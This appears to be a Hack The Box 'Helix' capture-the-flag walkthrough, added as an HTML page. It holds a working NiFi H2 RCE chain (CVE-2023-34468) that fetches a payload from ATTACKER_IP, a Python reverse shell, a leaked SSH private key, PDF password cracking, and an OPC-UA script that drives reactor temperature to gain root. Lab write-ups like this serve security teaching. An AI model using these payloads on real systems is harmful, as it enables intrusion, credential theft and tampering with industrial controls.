@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Helix — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">🧬</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='helix'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-helix','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-helix')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>Helix</span></h1><div class="hero-meta"><span>OS <strong>Linux</strong></span><span>Difficulty <strong>Hard</strong></span><span>Ports <strong>22 · 80</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">NiFi H2 RCE → nifi shell</span><span class="chain-arrow">→</span><span class="chain-node blue">SSH key backup → operator</span><span class="chain-arrow">→</span><span class="chain-node red">OPC-UA manipulation → maintenance window → root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.245.123</span>
+<span class="output">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://helix.htb/</span></code></pre>
+
+<p>Vhost enumeration discovers <code>flow.helix.htb</code> — an Apache NiFi 1.21.0 instance with <strong>no authentication</strong>.</p>
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>Initial Access — NiFi H2 Database RCE (CVE-2023-34468)</h2></div>
+
+<div class="callout callout-why">
+<span class="callout-label">What is Apache NiFi?</span>
+NiFi is a data flow automation tool — it moves data between systems using visual "processors" connected in a flow. It can connect to databases, run scripts, and execute system commands. When exposed without authentication, its full power is available to attackers.
+</div>
+
+<h3>Setting Up the Attack</h3>
+<p>NiFi's DBCPConnectionPool can connect to an H2 database. H2 supports <code>RUNSCRIPT</code> which loads and executes SQL from a URL. We abuse this to execute arbitrary Java code via <code>CREATE ALIAS</code>.</p>
+
+<p>Create the malicious SQL file on the attacker:</p>
+<pre><code><span class="comment"># poc.sql — creates a Java function that executes system commands</span>
+DROP ALIAS IF EXISTS SHELLEXEC;
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+    Runtime.getRuntime().exec(new String[]{"bash","-c",cmd});
+    return "ok"; }
+$$;
+CALL SHELLEXEC('curl http://ATTACKER_IP:8888/rev.sh -o /tmp/rev.sh && bash /tmp/rev.sh')</code></pre>
+
+<pre><code><span class="comment"># rev.sh — Python reverse shell (more reliable than /dev/tcp)</span>
+#!/bin/bash
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["bash","-i"])'</code></pre>
+
+<pre><code><span class="comment"># Terminal 1: HTTP server (poc.sql and rev.sh in same directory)</span>
+<span class="cmd">$ python3 -m http.server 8888</span>
+
+<span class="comment"># Terminal 2: listener</span>
+<span class="cmd">$ nc -lvnp 9002</span></code></pre>
+
+<h3>NiFi UI Configuration</h3>
+<p>In the NiFi web interface:</p>
+<p>1. Create a <strong>DBCPConnectionPool</strong> Controller Service:</p>
+<pre><code>Database Connection URL: jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;
+Database Driver Class Name: org.h2.Driver
+Database Driver Location: work/nar/extensions/nifi-poi-nar-1.21.0.nar-unpacked/NAR-INF/bundled-dependencies/h2-2.1.214.jar</code></pre>
+<p>2. Enable the service, then create an <strong>ExecuteSQL</strong> Processor:</p>
+<pre><code>Database Connection Pooling Service: DBCPConnectionPool
+SQL select query: RUNSCRIPT FROM 'http://ATTACKER_IP:8888/poc.sql'</code></pre>
+<p>3. Start the processor → NiFi fetches poc.sql → H2 executes Java code → reverse shell as <code>nifi</code>.</p>
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>Lateral Movement — nifi → operator</h2></div>
+
+<h3>SSH Key in Support Bundles</h3>
+<pre><code><span class="cmd">nifi@helix:$ find / -name "*.bak" 2>/dev/null</span>
+<span class="output"><span class="highlight">/opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak</span></span>
+
+<span class="cmd">nifi@helix:$ cat /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak</span>
+<span class="output">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
+WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
+AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
+tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
+-----END OPENSSH PRIVATE KEY-----</span>
+
+<span class="cmd">$ ssh -i operator_key operator@helix.htb</span>
+<span class="cmd">operator@helix:~$ cat user.txt</span>
+<span class="output">77955545a672b325260d6ab38a7a382f</span></code></pre>
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>Privilege Escalation — OPC-UA Industrial Control Manipulation</h2></div>
+
+<h3>Understanding the Environment</h3>
+<pre><code><span class="cmd">operator@helix:~$ sudo -l</span>
+<span class="output">(root) NOPASSWD: /usr/local/sbin/helix-maint-console</span></code></pre>
+
+<p>The maintenance console only works when a maintenance window is active (file <code>/opt/helix/state/maintenance_window</code> exists with a future timestamp). The window is created by <code>helix-safety</code> (root process) when reactor temperature reaches 295-304°C.</p>
+
+<p>Operator's home has an encrypted PDF with operational parameters. Crack it:</p>
+<pre><code><span class="cmd">$ pdf2john "Operator Control & Safety Guide.pdf" > hash.txt
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
+<span class="output"><span class="highlight">operator1</span></span>
+
+<span class="cmd">$ qpdf --password=operator1 --decrypt guide.pdf unlocked.pdf</span></code></pre>
+
+<h3>OPC-UA Manipulation</h3>
+<p>SSH tunnel internal ports, then use Python opcua library to manipulate the reactor:</p>
+
+<pre><code><span class="cmd">$ ssh -i operator_key -L 4840:127.0.0.1:4840 -L 8081:127.0.0.1:8081 operator@helix.htb</span></code></pre>
+
+<pre><code><span class="comment"># OPC-UA attack script — slowly ramp temperature to trigger maintenance window</span>
+<span class="cmd">python3 -c "</span>
+from opcua import Client, ua
+import time
+
+c = Client('opc.tcp://127.0.0.1:4840/helix/')
+c.connect()
+
+print('Step 1: Switch to MAINTENANCE + enable TestOverride')
+c.get_node('ns=2;i=12').set_value(ua.DataValue(ua.Variant('MAINTENANCE', ua.VariantType.String)))
+c.get_node('ns=2;i=13').set_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
+time.sleep(2)
+
+print('Step 2: Slowly ramp CalibrationOffset')
+offset = 0.0
+while True:
+    offset += 0.5
+    if offset > 12.0:
+        offset = 12.0
+    c.get_node('ns=2;i=12').set_value(ua.DataValue(ua.Variant('MAINTENANCE', ua.VariantType.String)))
+    c.get_node('ns=2;i=13').set_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
+    c.get_node('ns=2;i=6').set_value(ua.DataValue(ua.Variant(offset, ua.VariantType.Double)))
+    temp = c.get_node('ns=2;i=4').get_value()
+    trip = c.get_node('ns=2;i=10').get_value()
+    print(f'Offset={offset:.1f}, Temp={temp:.1f}, Trip={trip}')
+    if offset >= 12.0:
+        print('Holding at target offset...')
+        while True:
+            c.get_node('ns=2;i=12').set_value(ua.DataValue(ua.Variant('MAINTENANCE', ua.VariantType.String)))
+            c.get_node('ns=2;i=13').set_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
+            c.get_node('ns=2;i=6').set_value(ua.DataValue(ua.Variant(12.0, ua.VariantType.Double)))
+            time.sleep(0.3)
+    time.sleep(1)
+<span class="cmd">"</span></code></pre>
+
+<p>Once temperature reaches the 295-304°C window, the safety controller creates the maintenance window file. Quickly in another terminal:</p>
+
+<pre><code><span class="cmd">operator@helix:~$ sudo /usr/local/sbin/helix-maint-console</span>
+<span class="output">[+] Privileged maintenance access granted
+[!] Window expires in 118 seconds
+[!] Session will be terminated automatically</span>
+
+<span class="cmd">root@helix:~# cat root.txt</span>
+<span class="output">b3ba3738b45a6c4edf2f9e1ff05e4a52</span></code></pre>
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>NiFi without authentication = direct RCE.</strong><p>NiFi's database connectivity features allow loading remote SQL scripts via H2's RUNSCRIPT, which can execute arbitrary Java code.</p></div>
+<div class="takeaway-item"><strong>Backup files in application directories are gold.</strong><p>The SSH key was in <code>support-bundles/</code> — a directory that developers rarely clean up.</p></div>
+<div class="takeaway-item"><strong>ICS/OT attacks require understanding business logic.</strong><p>Brute-forcing the offset causes a trip (safety shutdown). The PDF documentation revealed the exact thresholds and timing needed for a controlled approach.</p></div>
+<div class="takeaway-item"><strong>Read the documentation.</strong><p>The encrypted PDF contained the exact parameters needed. Cracking it with john was trivial — the real skill was knowing to look for it.</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">NiFi H2 RCE</span><span class="arrow">→</span><span class="node node-green">nifi shell</span><span class="arrow">→</span><span class="node node-blue">SSH key → operator</span><span class="arrow">→</span><span class="node node-red">OPC-UA → maint window → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Helix Writeup · 2026</footer>
+</body></html>
